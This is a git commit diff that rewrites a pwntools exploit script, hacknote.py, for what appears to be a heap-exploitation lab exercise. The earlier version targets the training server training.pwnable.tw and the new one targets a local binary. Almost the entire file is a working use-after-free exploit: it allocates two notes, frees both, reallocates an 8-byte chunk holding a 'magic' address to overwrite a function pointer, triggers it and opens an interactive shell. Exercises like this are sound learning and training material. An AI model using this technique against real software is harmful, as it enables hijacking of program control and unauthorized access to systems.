774828433441080b7af664af9534d59528b571ee
Ashen <56328586+jasonkyle1208@users.noreply.github.com>
2022-05-10 16:19:17 +0800

    Update hacknote.py

--- LAB/lab10/hacknote.py
+++ LAB/lab10/hacknote.py
@@ -1,40 +1,29 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-from pwnpwnpwn import *
 from pwn import *
 
-host = "training.pwnable.tw"
-port = 11010
+io = process('./hacknote')
 
-r = remote(host,port)
+magic = 0x8048986
 
-def addnote(size,content):
-    r.recvuntil(":")
-    r.sendline("1")
-    r.recvuntil(":")
-    r.sendline(str(size))
-    r.recvuntil(":")
-    r.sendline(content)
+def add(size,content):
+    io.sendlineafter("Your choice :",'1')
+    io.sendlineafter("Note size :",str(size))
+    io.sendlineafter("Content :",content)
 
-def delnote(idx):
-    r.recvuntil(":")
-    r.sendline("2")
-    r.recvuntil(":")
-    r.sendline(str(idx))
+def free(idx):
+    io.sendlineafter("Your choice :",'2')
+    io.sendlineafter("Index :",str(idx))
 
-def printnote(idx):
-    r.recvuntil(":")
-    r.sendline("3")
-    r.recvuntil(":")
-    r.sendline(str(idx))
+def show(idx):
+    io.sendlineafter("Your choice :",'3')
+    io.sendlineafter("Index :",str(idx))
 
-magic = 0x08048986
-system = 0x8048506
-addnote(32,"ddaa")
-addnote(32,"ddaa")
-addnote(32,"ddaa")
-delnote(0)
-delnote(1)
-addnote(8,p32(magic))
-printnote(0)
-r.interactive()
+add(30,'aaaa')
+add(30,'bbbb')
+free(0)
+free(1)
+add(8,p32(magic))
+show(0)
+io.interactive()
+
